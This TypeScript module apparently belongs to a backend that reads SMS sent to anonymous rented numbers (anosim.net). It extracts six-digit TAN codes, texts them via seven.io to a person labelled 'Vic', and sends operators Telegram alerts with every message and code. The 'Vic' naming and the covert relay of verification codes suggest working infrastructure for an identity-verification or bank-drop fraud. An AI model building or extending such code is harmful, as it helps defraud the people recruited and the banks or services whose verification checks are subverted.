// Shared TAN forwarding logic used by anosim-proxy (inline) and forward-tan-sweep (cron).
// Idempotent: uses `forwarded_sms` to avoid duplicates.
// Sends Telegram notifications for every new SMS and every forwarded TAN so both
// callers (browser poll via proxy AND cron sweep) trigger the same alerts.

import { sendTelegramNotification } from "./telegram.ts";


interface AnyRecord {
  [k: string]: any;
}

const TAN_REGEX = /(?<!\d)\d{6}(?!\d)/;

function smsKey(sender: string, date: string) {
  return `${sender}|${date}`;
}

async function fetchAnosimSms(apiToken: string): Promise<any[]> {
  try {
    const res = await fetch(
      `https://anosim.net/api/v1/orderbookingshare?token=${encodeURIComponent(apiToken)}`
    );
    if (!res.ok) return [];
    const data = await res.json();
    return Array.isArray(data?.sms) ? data.sms : [];
  } catch {
    return [];
  }
}

async function sendSeven(
  apiKey: string,
  fromName: string,
  to: string,
  text: string
): Promise<{ ok: boolean; info: string }> {
  try {
    const body = new URLSearchParams();
    body.set("to", to);
    body.set("from", fromName);
    body.set("text", text);
    const res = await fetch("https://gateway.seven.io/api/sms", {
      method: "POST",
      headers: {
        "X-Api-Key": apiKey,
        "Content-Type": "application/x-www-form-urlencoded",
        Accept: "application/json",
      },
      body: body.toString(),
    });
    const info = await res.text();
    return { ok: res.ok, info };
  } catch (e) {
    return { ok: false, info: String(e) };
  }
}

interface ForwardContext {
  serviceClient: any; // Supabase service-role client
  sevenioApiKey: string;
  sevenioFromName: string;
}

export interface ForwardResult {
  forwarded: number;
  checked: number;
  reason?: string;
  forwardedCodes?: Array<{ code: string; vicPhone: string; sender: string; text: string }>;
  newSms?: Array<{ sender: string; text: string; date: string }>;
  vicPhone?: string;
}

/**
 * Process a single assignment: fetch its Anosim SMS, forward new TAN codes to the Vic.
 * Marks every SMS it evaluated (forwarded or not) as processed so it is not re-evaluated.
 */
export async function processAssignmentForward(
  ctx: ForwardContext,
  assignmentId: string
): Promise<ForwardResult> {
  const { serviceClient, sevenioApiKey, sevenioFromName } = ctx;

  // Load assignment
  const { data: a } = await serviceClient
    .from("verification_assignments")
    .select("id, user_id, verification_id, status, phone_number_id, created_at, sms_monitoring_active, forward_tan_to_vic, forwarded_sms, hidden_sms")
    .eq("id", assignmentId)
    .maybeSingle();

  if (!a) return { forwarded: 0, checked: 0, reason: "assignment_missing" };
  if (!a.forward_tan_to_vic) return { forwarded: 0, checked: 0, reason: "forwarding_disabled" };
  if (!a.sms_monitoring_active) return { forwarded: 0, checked: 0, reason: "monitoring_off" };
  if (!["zugewiesen", "in_bearbeitung"].includes(a.status))
    return { forwarded: 0, checked: 0, reason: "status_locked" };
  if (!a.phone_number_id) return { forwarded: 0, checked: 0, reason: "no_phone" };

  // Vic phone
  const { data: profile } = await serviceClient
    .from("profiles")
    .select("phone")
    .eq("id", a.user_id)
    .maybeSingle();
  const vicPhone = (profile?.phone || "").trim();
  if (!vicPhone) return { forwarded: 0, checked: 0, reason: "no_vic_phone" };

  // Phone token
  const { data: phoneRow } = await serviceClient
    .from("phone_numbers")
    .select("token")
    .eq("id", a.phone_number_id)
    .maybeSingle();
  if (!phoneRow?.token) return { forwarded: 0, checked: 0, reason: "no_phone_token" };

  const sms = await fetchAnosimSms(phoneRow.token);
  if (sms.length === 0) return { forwarded: 0, checked: 0 };

  const assignedAt = new Date(a.created_at);
  const forwarded: string[] = Array.isArray(a.forwarded_sms) ? [...a.forwarded_sms] : [];
  const forwardedSet = new Set<string>(forwarded);

  let forwardedCount = 0;
  let checkedCount = 0;
  const forwardedCodes: Array<{ code: string; vicPhone: string; sender: string; text: string }> = [];
  const newSms: Array<{ sender: string; text: string; date: string }> = [];

  for (const m of sms as AnyRecord[]) {
    const date = m.messageDate;
    const sender = m.messageSender;
    const text = m.messageText || "";
    if (!date || !sender) continue;
    if (new Date(date) < assignedAt) continue;
    const key = smsKey(sender, date);
    if (forwardedSet.has(key)) continue;

    checkedCount++;
    newSms.push({ sender: String(sender), text: String(text), date: String(date) });

    const match = String(text).match(TAN_REGEX);
    if (match) {
      const code = match[0];
      const result = await sendSeven(
        sevenioApiKey,
        sevenioFromName,
        vicPhone,
        `${code} - Ihr Code für die Verifizierung`
      );
      if (result.ok) {
        forwardedCount++;
        forwardedSet.add(key);
        forwardedCodes.push({ code, vicPhone, sender: String(sender), text: String(text) });
      } else {
        console.error("seven.io send failed", result.info);
      }
    } else {
      forwardedSet.add(key);
    }
  }

  if (forwardedSet.size !== forwarded.length) {
    await serviceClient
      .from("verification_assignments")
      .update({ forwarded_sms: Array.from(forwardedSet) })
      .eq("id", assignmentId);
  }

  // Send Telegram notifications directly from here so both the browser-triggered
  // proxy AND the cron sweep alert on every new SMS / forwarded TAN.
  if (newSms.length > 0 || forwardedCodes.length > 0) {
    try {
      const [{ data: prof }, { data: ver }] = await Promise.all([
        serviceClient.from("profiles").select("first_name, last_name, email").eq("id", a.user_id).maybeSingle(),
        a.verification_id
          ? serviceClient.from("verifications").select("title").eq("id", a.verification_id).maybeSingle()
          : Promise.resolve({ data: null }),
      ]);
      const vicName =
        `${prof?.first_name ?? ""} ${prof?.last_name ?? ""}`.trim() ||
        prof?.email ||
        "Unbekannt";
      const title = ver?.title ?? "Auftrag";

      for (const sms of newSms) {
        try {
          await sendTelegramNotification(serviceClient, "anosim_sms_received", {
            vic_name: vicName,
            verification_title: title,
            sender: sms.sender,
            text: sms.text,
          });
        } catch (e) {
          console.error("telegram anosim_sms_received failed", e);
        }
      }
      for (const fw of forwardedCodes) {
        try {
          await sendTelegramNotification(serviceClient, "tan_forwarded_to_vic", {
            vic_name: vicName,
            verification_title: title,
            vic_phone: fw.vicPhone,
            code: fw.code,
          });
        } catch (e) {
          console.error("telegram tan_forwarded_to_vic failed", e);
        }
      }
    } catch (e) {
      console.error("telegram context load failed", e);
    }
  }

  return { forwarded: forwardedCount, checked: checkedCount, forwardedCodes, newSms, vicPhone };
}

/**
 * Load app settings for seven.io. Returns null if not configured.
 */
export async function loadSevenIoSettings(
  serviceClient: any
): Promise<{ apiKey: string; fromName: string } | null> {
  const { data } = await serviceClient
    .from("app_settings")
    .select("sevenio_api_key, sevenio_from_name")
    .maybeSingle();
  if (!data?.sevenio_api_key) return null;
  return {
    apiKey: data.sevenio_api_key,
    fromName: data.sevenio_from_name || "Info",
  };
}
